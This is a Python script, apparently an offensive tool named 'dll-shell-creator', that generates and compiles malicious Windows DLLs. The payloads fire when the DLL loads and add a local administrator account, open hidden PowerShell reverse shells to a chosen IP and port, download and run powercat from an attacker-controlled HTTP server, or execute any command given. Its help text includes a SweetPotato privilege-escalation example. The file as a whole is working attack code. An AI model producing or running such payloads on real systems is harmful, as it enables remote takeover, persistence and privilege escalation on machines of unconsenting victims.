import argparse
import random
import string
import base64
import os
import subprocess
from termcolor import colored

def generate_random_filename(extension='cpp'):
    """Generate a random filename with the given extension."""
    random_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{random_name}.{extension}"

def generate_powercat_command(ip, port):
    """Generate the PowerShell command to download and execute powercat.ps1 using cmd.exe."""
    command = f'cmd.exe /c powershell -NoP -NonI -W Hidden -Exec Bypass -Command \\"IEX (New-Object System.Net.Webclient).DownloadString(\'http://{ip}/powercat.ps1\');powercat -c {ip} -p {port} -e powershell\\"'
    return command

def generate_dll_code(payload_type, ip=None, port=None, username=None, password=None, command=None):
    """Generate the C++ code for the DLL based on the payload type."""
    common_code = '''#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,
DWORD ul_reason_for_call,
LPVOID lpReserved )
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH:
        int i;
'''
    
    if payload_type == "add_user":
        payload_code = f'''
        i = system("net user {username} {password} /add");
        i = system("net localgroup administrators {username} /add");
'''
    elif payload_type == "reverse_shell":
        payload_code = f'''
        system("powershell -NoP -NonI -W Hidden -Exec Bypass -Command \\"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\\\"");
'''
    elif payload_type == "stealth_reverse_shell":
        payload_code = f'''
        system("powershell -WindowStyle Hidden -NoP -NonI -W Hidden -Exec Bypass -Command \\"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\\\"");
'''
    elif payload_type == "powercat":
        powercat_command = generate_powercat_command(ip, port)
        payload_code = f'''
        system("{powercat_command}");
'''
    elif payload_type == "execute_command":
        if command:
            # Escaping backslashes and quotes for the system call
            escaped_command = command.replace('\\', '\\\\').replace('"', '\\"')
            payload_code = f'''
            i = system("{escaped_command}");
'''
        else:
            raise ValueError("No command provided for execute_command type.")
    else:
        raise ValueError("Invalid payload type")

    closing_code = '''
        break;
        case DLL_THREAD_ATTACH:
        break;
        case DLL_THREAD_DETACH:
        break;
        case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
'''
    return common_code + payload_code + closing_code

def main():
    description = """Generate C++ code for a DLL with various payloads.

Examples:

1. Add a user to the system:
   python3 dll-shell-creator.py --type add_user --username admin --password pass123 --output AddUserDLL

2. Generate a reverse shell DLL:
   python3 dll-shell-creator.py --type reverse_shell --ip 192.168.1.10 --port 4444 --output ReverseShellDLL

3. Generate a stealth reverse shell DLL:
   python3 dll-shell-creator.py --type stealth_reverse_shell --ip 192.168.1.10 --port 4444 --output StealthShellDLL

4. Generate a powercat-based reverse shell DLL:
   python3 dll-shell-creator.py --type powercat --ip 192.168.119.3 --port 4444 --output PowercatShellDLL

   *Before running this command, ensure that `powercat.ps1` is available in the current directory. Additionally, start a simple HTTP server to serve the `powercat.ps1` file by running the following command in the same folder: python3 -m http.server 80*

5. Execute a custom command:
   python3 dll-shell-creator.py --type execute_command --command 'c:\\users\\public\\downloads\\SweetPotato.exe -t s4u -p cmd.exe -a \\"/c start cmd.exe\\"' --output CustomCommandDLL
"""

    parser = argparse.ArgumentParser(description=description, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("--type", choices=["add_user", "reverse_shell", "stealth_reverse_shell", "powercat", "execute_command"], required=True, help="Type of payload to include in the DLL.")
    parser.add_argument("--output", help="Output filename for the generated C++ file. Defaults to a random name with .cpp extension.")
    parser.add_argument("--ip", help="IP address for reverse shell listener (required for reverse shell payloads).")
    parser.add_argument("--port", help="Port number for reverse shell listener (required for reverse shell payloads).")
    parser.add_argument("--username", default="pepe", help="Username for add_user payload (default: pepe).")
    parser.add_argument("--password", default="password123!", help="Password for add_user payload (default: password123!).")
    parser.add_argument("--command", help="Command to execute for execute_command payload.")
    parser.add_argument("--compile", action='store_true', help="Compile the generated C++ code into a DLL.")

    args = parser.parse_args()

    if args.type in ["reverse_shell", "stealth_reverse_shell", "powercat"]:
        if not args.ip or not args.port:
            parser.error("--ip and --port are required for reverse shell payloads.")
    
    if args.type == "execute_command" and not args.command:
        parser.error("--command is required for execute_command payload.")
    
    # Determine the output filename
    if args.output:
        output_filename = args.output if args.output.endswith('.cpp') else args.output + '.cpp'
    else:
        output_filename = generate_random_filename()

    dll_code = generate_dll_code(args.type, args.ip, args.port, args.username, args.password, args.command)

    # Write the C++ code to a file
    with open(output_filename, 'w') as cpp_file:
        cpp_file.write(dll_code)

    dll_filename = output_filename.replace('.cpp', '.dll')
    compile_command = f'x86_64-w64-mingw32-gcc {output_filename} --shared -o {dll_filename}'

    print(colored(f'\nSuccessfully created {output_filename}\n', 'green'))
    print(colored(f'Compile command:\n{compile_command}\n', 'blue'))

    if args.compile:
        print(colored(f'Compiling {output_filename} into {dll_filename}...', 'yellow'))
        result = subprocess.run(compile_command, shell=True)
        if result.returncode == 0 and os.path.exists(dll_filename):
            print(colored(f'Compilation successful! DLL created: {dll_filename}', 'green'))
            os.remove(output_filename)
            print(colored(f'Deleted the source file: {output_filename}', 'red'))
        else:
            print(colored('Compilation failed.', 'red'))

    if args.type == "add_user":
        print(colored(f'User: {args.username}', 'yellow'))
        print(colored(f'Password: {args.password}\n', 'yellow'))
    elif args.type == "execute_command":
        print(colored(f'Command: {args.command}\n', 'yellow'))
    elif args.type == "powercat":
        print(colored(f'\nThe Powercat payload will use the following IP and port:\nIP: {args.ip}\nPort: {args.port}\n', 'yellow'))

if __name__ == "__main__":
    main()
